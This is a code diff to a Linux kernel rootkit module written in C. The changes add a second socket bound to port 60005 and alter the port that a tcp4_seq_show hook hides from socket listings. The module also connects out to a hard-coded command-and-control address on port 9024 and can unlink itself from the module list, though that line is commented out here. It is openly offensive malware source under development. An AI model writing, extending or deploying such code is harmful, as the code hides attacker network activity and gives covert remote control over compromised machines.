@@ -32,7 +32,9 @@ struct linux_dirent {
 };
 
 char cncIpAddress[16] = "192.168.1.183";
+char rootkitIpAddress[16] = "192.168.64.3";
 struct socket *cncSocket;
+struct socket *rootkitSocket;
 struct msghdr msg;
 
 struct rootkitMessage {
@@ -110,7 +112,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
     struct sock *sk = v;
 
     //put number in hex
-    if (sk != 0x1 && sk->sk_num == 0x8532)
+    if (sk != 0x1 && sk->sk_num == 0xEA65)
         return 0;
 
     return orig_tcp4_seq_show(seq, v);
@@ -235,13 +237,42 @@ static int __init rootkit_init(void)
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
+    
+    struct sockaddr_in rootkitAddress;
+    memset(&rootkitAddress, 0, sizeof(rootkitAddress));
+    rootkitAddress.sin_family = AF_INET;
+    rootkitAddress.sin_port = htons(60005);
+    rootkitAddress.sin_addr.s_addr = htonl(INADDR_ANY);
+    
+    //struct sockaddr_in rootkitAddress = {
+    //  .sin_family = AF_INET,
+    //  .sin_port = htons(8080),
+    //  .sin_addr = {htonl(INADDR_ANY)}
+    //};
+
+
+    //if (rootkitSocketErr < 0){
+    //	printk("Socket creation for rootkit failed");
+    //}
+    //else{
+    //	printk("Socket for Rootkit Bound Correctly, Socket Number:%d\n", rootkitSocketErr);
+    //}
+
+    //int rootkitRet = rootkitSocket->ops->bind(rootkitSocket, (struct sockaddr *) &rootkitAddress, sizeof(rootkitAddress));
+    //if (rootkitRet < 0){
+    //	printk("Rootkit Socket Connection Ret:%d\n", rootkitRet);
+    //}
+    //else{
+    //	printk("Socket for Rootkit in Binded, Bound Number:%d\n", rootkitRet);
+    //}
+
 
     struct sockaddr_in cncAddress;
     memset(&cncAddress, 0, sizeof(cncAddress));
     cncAddress.sin_family = AF_INET;
     cncAddress.sin_port = htons(9024);
     cncAddress.sin_addr.s_addr = in_aton(cncIpAddress);
-
+    
     memset(&msg, 0x00, sizeof(msg));
     msg.msg_name=(struct sockaddr_in*) &cncAddress;
     msg.msg_namelen=sizeof(cncAddress);
@@ -256,12 +287,20 @@ static int __init rootkit_init(void)
 	printk("Socket Bound Correctly, Socket Number:%d\n", socketErr);
     }
 
+    int rootkitRet = cncSocket->ops->bind(cncSocket, (struct sockaddr *) &rootkitAddress, sizeof(rootkitAddress));
+    if (rootkitRet < 0){
+        printk("Rootkit Socket Connection Ret:%d\n", rootkitRet);
+    }
+    else{
+        printk("Socket for Rootkit in Binded, Bound Number:%d\n", rootkitRet);
+    }
+
     int ret = cncSocket->ops->connect(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress), O_RDWR);
     if (ret < 0){
        printk("Socket Connection Ret:%d\n", ret);
     }
 
-    list_del(&THIS_MODULE->list);
+    //list_del(&THIS_MODULE->list);
 
 
     printk(KERN_INFO "rootkit: loaded\n");
@@ -285,6 +324,7 @@ static void __exit rootkit_exit(void)
     //printk("End Message Bytes: %d\n", endMsgErr);
     
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    sock_release(cncSocket);
     printk(KERN_INFO "rootkit: unloaded\n");
 }
 
